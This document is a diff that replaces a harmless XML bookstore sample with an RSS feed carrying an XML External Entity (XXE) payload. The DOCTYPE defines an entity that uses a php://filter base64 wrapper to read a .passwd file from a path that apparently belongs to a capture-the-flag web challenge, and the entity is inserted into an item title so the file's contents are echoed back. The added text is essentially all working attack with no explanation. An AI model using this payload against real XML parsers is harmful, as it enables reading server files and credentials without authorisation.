@@ -1,14 +1,24 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<bookstore xmlns:xlink="http://www.w3.org/1999/xlink">
-   <book title="Harry Potter">
-      <description xlink:type="simple" xlink:href="/images/HPotter.gif" xlink:show="new">
-         As his fifth year at Hogwarts School of Witchcraft and Wizardry approaches, ...
-      </description>
-   </book>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE rss[
+   <!ELEMENT rss (channel)>
+   <!ATTLIST rss version CDATA "2.0">
+   <!ELEMENT channel (title, link, description, item+)>
+   <!ELEMENT title (#PCDATA)>
+   <!ELEMENT link (#PCDATA)>
+   <!ELEMENT description (#PCDATA)>
+   <!ELEMENT item (title, link, description)>
+   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/.passwd" >
+]>
 
-   <book title="XQuery Kick Start">
-      <description xlink:type="simple" xlink:href="/images/XQuery.gif" xlink:show="new">
-         XQuery Kick Start delivers a concise introduction to the XQuery standard...
-      </description>
-   </book>
-</bookstore>
+<rss version="2.0">
+<channel>
+  <title>W3Schools Home Page</title>
+  <link>https://www.w3schools.com</link>
+  <description>Free web building tutorials</description>
+  <item>
+    <title>&xxe;</title>
+    <link>https://www.w3schools.com/xml</link>
+    <description>New XML tutorial on W3Schools</description>
+  </item>
+</channel>
+</rss> 
